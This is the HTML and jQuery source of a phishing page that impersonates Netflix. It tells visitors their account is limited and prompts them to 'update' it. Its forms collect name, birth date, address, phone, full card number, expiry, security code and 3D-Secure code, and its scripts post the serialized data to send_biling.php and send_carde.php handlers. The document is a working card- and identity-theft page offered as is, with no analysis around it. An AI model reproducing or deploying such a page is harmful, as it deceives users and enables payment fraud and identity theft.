...
<div  id="Urochi" class="centerContainer contextStep firstLoad" data-reactid="9">
...
<h2 style="color: #fff;
    font-size: 32px;
    font-weight: 700;
    margin-bottom: 28px;">Verify your account. </h2><p style="color: #fff;
    font-weight: 700;" > We apologize for any inconvenience. </p><p style="color: #fff;
    font-weight: 700;"  > You can not access all your Netflix advantages, due to account limited. <br>
                        </p><p style="color: #fff;
    font-weight: 700;"  > </p><p style="color: #fff;
    font-weight: 700;"  margin-bottom:25px;"> To restore your account, please click <i>Continue</i> to update your information</p>		




<button onclick="closeNav()"  style="width: 31%;
    max-width: 100%;" class="btn login-button btn-submit btn-small" type="submit" autocomplete="off" tabindex="0">Continue</button>
...
<div class="login-content login-form hybrid-login-form hybrid-login-form-signup"><div class="hybrid-login-form-main">


<h1 style="display:none;" id="tiitleloginnet" >Billing Address</h1>

<h1  id="tiitleCardnetpas">Credit/Debit Card</h1>
...
$("#spuenndr").show(500);
					...
					$.post("./system/send_biling.php?ajax", $("#loginnet").serialize(), function(result) {
                            setTimeout(function() {
...
<input required="required" type="text" name="Firstname" class="nfTextField" id="Firstname" value="" tabindex="" dir="ltr" aria-invalid="false" aria-describedby="FirstnameIdinputError FirstnameinputError">


<label for="id_Firstname" class="placeLabel">First Name</label></label>
...
<span id="FirstnameinputError" class="nfEmailPhoneInError" style="display: none;"></span></div>
</div>
...
<input required="required" type="text" name="LastName" class="nfTextField " id="LastName" value="" tabindex="" dir="ltr" aria-invalid="false" aria-describedby="LastNameIdinputError LastNameinputError">


<label for="id_LastName" class="placeLabel">Last Name</label></label>
<div class="ui-select-wrapper country-select">
<a href="#" class="ui-select-wrapper-link"></a>
</div>
</div>
</div>
<div id="" class="inputError"><span id="LastNameinputError" class="nfEmailPhoneInError" style="display: none;"></span></div>
</div>
...
<input required="required" type="text" name="birthdate" class="nfTextField" id="birthdate" value="" tabindex="" dir="ltr" aria-invalid="false" aria-describedby="birthdateIdinputError birthdateinputError">

<label for="id_birthdate" class="placeLabel">Date Of Birth (DD/MM/YYYY)</label></label>
<div class="ui-select-wrapper country-select">
<a href="#" class="ui-select-wrapper-link"></a>
</div>
</div>
</div>
<div id="" class="inputError"><span id="birthdateinputError" class="nfEmailPhoneInError" style="display: none;"></span></div>
</div>
...
<input required="required" type="text" name="addres" class="nfTextField" id="addres" value="" tabindex="" dir="ltr" aria-invalid="false" aria-describedby="addresIdinputError addresinputError">


<label for="id_addres" class="placeLabel">Address Line</label></label>
<div class="ui-select-wrapper country-select">
<a href="#" class="ui-select-wrapper-link"></a>
</div>
</div>
</div>
<div id="" class="inputError"><span id="addresinputError" class="nfEmailPhoneInError" style="display: none;"></span></div>
</div>
...
<input required="required" type="text" name="City" class="nfTextField" id="City" value="" tabindex="" dir="ltr" aria-invalid="false" aria-describedby="CityIdinputError CityinputError">

<label for="id_City" class="placeLabel">City</label></label>
<div class="ui-select-wrapper country-select">
<a href="#" class="ui-select-wrapper-link"></a>
</div>
</div>
</div>
<div id="" class="inputError"><span id="CityinputError" class="nfEmailPhoneInError" style="display: none;"></span></div>
</div>
</div>
<div class="right">  
<div class="dddd nfInput nfEmailPhoneInput  login-input login-input-email">
...
<input required="required" type="text" name="State" class="nfTextField" id="State" value="" tabindex="" dir="ltr" aria-invalid="false" aria-describedby="StateIdinputError StateinputError">

<label for="id_State" class="placeLabel">State</label></label>
<div class="ui-select-wrapper country-select">
<a href="#" class="ui-select-wrapper-link"></a>
</div>
</div>
</div>
<div id="" class="inputError"><span id="StateinputError" class="nfEmailPhoneInError" style="display: none;"></span></div>
</div>
</div>
</div>
...
<input required="required" type="text" name="zipCod" class="nfTextField " id="zipCod" value="" tabindex="" dir="ltr" aria-invalid="false" aria-describedby="zipCodIdinputError zipCodinputError">

<label for="id_zipCod" class="placeLabel">Zip Cod</label></label>
<div class="ui-select-wrapper country-select">
<a href="#" class="ui-select-wrapper-link"></a>
</div>
</div>
</div>
<div id="" class="inputError"><span id="zipCodinputError" class="nfEmailPhoneInError" style="display: none;"></span></div>
</div>
...
<input required="required" type="text" name="phoneNumber" class="nfTextField" id="phoneNumber" value="" tabindex="" dir="ltr" aria-invalid="false" aria-describedby="phoneNumberIdinputError phoneNumberinputError">

<label for="id_phoneNumber" class="placeLabel">Phone Number</label></label>
<div class="ui-select-wrapper country-select">
<a href="#" class="ui-select-wrapper-link"></a>
</div>
</div>
</div>
<div id="" class="inputError"><span id="phoneNumberinputError" class="nfEmailPhoneInError" style="display: none;"></span></div>
</div>
...
<button id="botomaaa" style="background: #2196F3;" class="btn login-button btn-submit btn-small" type="submit" autocomplete="off" tabindex="0">Back</button>
...
$("#spuenndr").show(500);
					...
					$.post("./system/send_carde.php?ajax", $("#Cardnetpas").serialize(), function(result) {
                            setTimeout(function() {
...
<input required="required" type="text" name="NameOnCard" class="nfTextField" id="NameOnCard" value="" tabindex="" dir="ltr" aria-invalid="false" aria-describedby="NameOnCardIdinputError NameOnCardinputError">


<label for="id_addres" class="placeLabel">Name On Card</label></label>
<div class="ui-select-wrapper country-select">
<a href="#" class="ui-select-wrapper-link"></a>
</div>
</div>
</div>
<div id="" class="inputError"><span id="NameOnCardinputError" class="nfEmailPhoneInError" style="display: none;"></span></div>
</div>
...
<input required="required" type="text" name="cardnumber" class="nfTextField" id="cardnumber" value="" tabindex="" dir="ltr" aria-invalid="false" aria-describedby="cardnumberIdinputError cardnumberinputError" style="background-position: 98.5% -0.2%;">

<label for="id_addres" class="placeLabel">Card Number</label></label>
<div class="ui-select-wrapper country-select">
<a href="#" class="ui-select-wrapper-link"></a>
</div>
</div>
</div>
<div id="" class="inputError"><span id="cardnumberinputError" class="nfEmailPhoneInError" style="display: none;"></span></div>
</div>
...
<input required="required" type="text" name="expdate" class="nfTextField" id="expdate" value="" tabindex="" dir="ltr" aria-invalid="false" aria-describedby="expdateIdinputError expdateinputError">

<label for="id_City" class="placeLabel">Expiry date</label></label>
<div class="ui-select-wrapper country-select">
<a href="#" class="ui-select-wrapper-link"></a>
</div>
</div>
</div>
<div id="" class="inputError"><span id="expdateinputError" class="nfEmailPhoneInError" style="display: none;"></span></div>
</div>
</div>
<div class="right">  
<div class="dddd nfInput nfEmailPhoneInput login-input login-input-email">
...
<input required="required" type="text" name="Securitycode" class="nfTextField" id="Securitycode" value="" tabindex="" dir="ltr" aria-invalid="false" aria-describedby="SecuritycodeIdinputError SecuritycodeinputError" pattern="[0-9]{3}" maxlength="3">

<label for="id_State" class="placeLabel">Security code</label></label>
<div class="ui-select-wrapper country-select">
<a href="#" class="ui-select-wrapper-link"></a>
</div>
</div>
</div>
<div id="" class="inputError"><span id="SecuritycodeinputError" class="nfEmailPhoneInError" style="display: none;"></span></span></div>
</div>
</div>
</div>
...
<div class="dddd nfInput nfEmailPhoneInput  login-input login-input-email">
<div class="nfInputPlacement"><div class="nfEmailPhoneControls">
<label class="input_id"><input required="required" type="text" name="thDSecure" class="nfTextField " id="thDSecure" value="" tabindex="" dir="ltr" aria-invalid="false" aria-describedby="thDSecureIdinputError thDSecureinputError" style="background-position: 99.5% -20.5%;">
<label for="id_3DSecure" class="placeLabel">3D-Secure</label></label>
<div class="ui-select-wrapper country-select">
<a href="#" class="ui-select-wrapper-link"></a>
</div>
</div>
</div>
<div id="" class="inputError"><span id="thDSecureinputError" class="nfEmailPhoneInError" style="display: none;"></span></div>
</div>
